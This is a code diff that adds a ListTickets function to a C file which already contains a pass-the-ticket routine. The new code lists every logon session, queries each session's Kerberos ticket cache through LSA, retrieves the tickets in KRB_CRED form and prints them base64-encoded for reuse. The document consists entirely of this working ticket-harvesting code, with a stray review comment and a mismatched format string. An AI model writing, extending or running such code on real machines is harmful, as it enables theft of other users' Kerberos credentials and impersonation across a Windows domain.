@@ -319,3 +319,126 @@ NTSTATUS Ptt(PVOID data, DWORD dataSize) {
 
   return status;
 }
+
+NTSTATUS ListTickets() {
+  HMODULE secure32 = LoadLibraryA("secur32.dll");
+  // get logon sessions
+  LsaEnumerateLogonSessions_t LsaEnumerateLogonSessions =
+      (LsaEnumerateLogonSessions_t)GetProcAddress(secure32,
+                                                  "LsaEnumerateLogonSessions");
+  LsaGetLogonSessionData_t LsaGetLogonSessionData =
+      (LsaGetLogonSessionData_t)GetProcAddress(secure32,
+                                               "LsaGetLogonSessionData");
+  LsaCallAuthenticationPackage_t LsaCallAuthenticationPackage =
+      (LsaCallAuthenticationPackage_t)GetProcAddress(
+          secure32, "LsaCallAuthenticationPackage");
+  LsaFreeReturnBuffer_t LsaFreeReturnBuffer =
+      (LsaFreeReturnBuffer_t)GetProcAddress(secure32, "LsaFreeReturnBuffer");
+
+  PLUID Pluids;
+  ULONG count;
+  NTSTATUS status, protocolStatus;
+  HANDLE lsaHandle = NewLsaCredentialHandle();
+  ULONG authpkg = GetAuthPackage(lsaHandle, "Kerberos");
+
+  status = LsaEnumerateLogonSessions(&count, &Pluids);
+  if (status != 0) {
+    printf("failed to enumerate logged on sessions: 0x%lx\n", status);
+    return status;
+  }
+  printf("number of logged on sessions: %lu\n", count);
+
+  for (int i = 0; i < count; i++) {
+
+    LUID luid = Pluids[i];
+    PSECURITY_LOGON_SESSION_DATA sessionData;
+    status = LsaGetLogonSessionData(&luid, &sessionData);
+    if (status != 0x0) {
+      printf("failed to get session data: 0x%lx\n", status);
+      return status;
+    }
+    KERB_QUERY_TKT_CACHE_REQUEST req;
+    ULONG respSize = 0;
+    PVOID pResponse = NULL;
+    memset(&req, 0, sizeof(req));
+    req.MessageType = KerbQueryTicketCacheExMessage;
+    req.LogonId = luid;
+    status =
+        LsaCallAuthenticationPackage(lsaHandle, authpkg, &req, sizeof(req),
+                                     &pResponse, &respSize, &protocolStatus);
+    if (status != 0x0) {
+      printf("status is bad in LsaCallAuthenticationPackage: 0x%lu\n", status);
+      return status;
+    }
+    if (protocolStatus != 0x0) {
+      if (protocolStatus ==
+          STATUS_NO_SUCH_LOGON_SESSION) { // ignore/suppress non critical
+                                          // errors.
+        continue;
+      }
+      printf("protocolStatus is not ok: 0x%lu\n", protocolStatus);
+      return protocolStatus;
+    }
+    KERB_QUERY_TKT_CACHE_RESPONSE *pResp =
+        (KERB_QUERY_TKT_CACHE_RESPONSE *)pResponse;
+    ULONG countTick = pResp->CountOfTickets;
+    for (int i2 = 0; i2 < countTick; i2++) {
+      KERB_TICKET_CACHE_INFO_EX ticketResp = pResp->Tickets[i2];
+      // KERB_RETRIEVE_TKT_RESPONSE retrivedResp;
+      ULONG respSize = 0;
+
+      // You memset retrivedResp but not retriveTick
+
+      SIZE_T nameLen = ticketResp.ServerName.Length;
+      SIZE_T reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + nameLen;
+      KERB_RETRIEVE_TKT_REQUEST *retriveTick =
+          (KERB_RETRIEVE_TKT_REQUEST *)LocalAlloc(LPTR, reqSize);
+      // then set fields after
+      retriveTick->MessageType = KerbRetrieveEncodedTicketMessage;
+      retriveTick->LogonId = luid;
+      retriveTick->TicketFlags = ticketResp.TicketFlags;
+      retriveTick->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
+      retriveTick->EncryptionType = ticketResp.EncryptionType;
+
+      // Point Buffer to the memory immediately after the struct
+      retriveTick->TargetName.Length = (USHORT)nameLen;
+      retriveTick->TargetName.MaximumLength = (USHORT)nameLen;
+      retriveTick->TargetName.Buffer = (PWSTR)(retriveTick + 1);
+      memcpy(retriveTick->TargetName.Buffer, ticketResp.ServerName.Buffer,
+             nameLen);
+
+      PVOID respVoid = NULL;
+      status = LsaCallAuthenticationPackage(lsaHandle, authpkg, retriveTick,
+                                            (ULONG)reqSize, &respVoid,
+                                            &respSize, &protocolStatus);
+      if (status != 0x0) {
+        printf("bad status: 0x%lx\n", status);
+      }
+      if (protocolStatus != 0x0) {
+        if (protocolStatus == 0xC0000135) {
+          continue;
+        } // other stuff
+
+        printf("protocolStatus: 0x%lx\n", protocolStatus);
+      }
+
+      KERB_RETRIEVE_TKT_RESPONSE *retrivedResp =
+          (KERB_RETRIEVE_TKT_RESPONSE *)respVoid;
+      if (retrivedResp == NULL) {
+        continue;
+      }
+      printf("----------\n%s\n---------\n",
+             base64_encode(retrivedResp->Ticket.EncodedTicket,
+                           retrivedResp->Ticket.EncodedTicketSize));
+      if (respVoid) {
+        LsaFreeReturnBuffer(respVoid);
+        respVoid = NULL;
+      }
+    }
+    if (pResponse) {
+      LsaFreeReturnBuffer(pResponse);
+      pResponse = NULL;
+    }
+  }
+  return status;
+}
